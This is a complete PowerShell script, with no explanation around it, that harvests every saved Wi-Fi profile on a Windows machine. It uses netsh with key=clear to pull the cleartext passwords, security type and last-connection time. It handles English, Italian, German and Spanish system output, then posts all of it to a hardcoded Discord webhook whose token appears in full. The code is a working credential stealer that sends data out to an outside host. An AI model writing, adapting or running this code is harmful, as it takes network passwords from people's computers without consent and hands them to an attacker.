$Webhook="https://discord.com/api/webhooks/1391925819017793566/P6u2qHAbmqSFeu94T1beCpyWBO6khVVdCK66sy8a083xDZqRSyY5w5PDHDciVnh2ImDB"
$rawProfiles = netsh wlan show profile
$profiles = @()
foreach ($line in $rawProfiles) {
    if ($line -match '.*:.*') {
        $parts = $line -split ':'
        if ($parts.Length -ge 2) { 
            $profiles += $parts[1].Trim() 
        }
    }
}
$profiles = $profiles | Where-Object { $_ -ne "" } | Sort-Object -Unique
if ($profiles.Count -eq 0) { Write-Host "No Wi-Fi profiles found."; exit }

$fields = @()
foreach ($p in $profiles) {
    $details = netsh wlan show profile name="$p" key=clear
    $passLine = $details | Select-String "Key Content|Contenuto chiave|Inhaltsschl|Contenido de la clave"
    $securityLine = $details | Select-String "Authentication|Autenticazione|Authentifizierung|Autenticación"
    $lastConnLine = $details | Select-String "Last connected|Ultima connessione|Zuletzt verbunden|Última conexión"

    $password = if ($passLine) { ($passLine -split ':')[1].Trim() } else { '[No password / not found]' }
    $security = if ($securityLine) { ($securityLine -split ':')[1].Trim() } else { '[Security not found]' }
    $lastConn = if ($lastConnLine) { ($lastConnLine -split ':')[1].Trim() } else { '[Unknown]' }

    if ($p.Length -gt 0) {
        $fields += @{
            name = if ($p.Length -gt 256) { $p.Substring(0,256) } else { $p }
            value = "Password: $password`nSecurity: $security`nLast Connected: $lastConn"
            inline = $true
        }
    }
}

if ($fields.Count -eq 0) { Write-Host "No valid Wi-Fi profiles to send."; exit }

$embed = @{
    title = "Detected Wi-Fi Networks"
    color = 3447003
    fields = $fields
}
$body = @{ embeds = @($embed) } | ConvertTo-Json -Depth 4
Invoke-RestMethod -Uri $Webhook -Method Post -Body $body -ContentType "application/json"
Write-Host "Wi-Fi networks sent successfully."
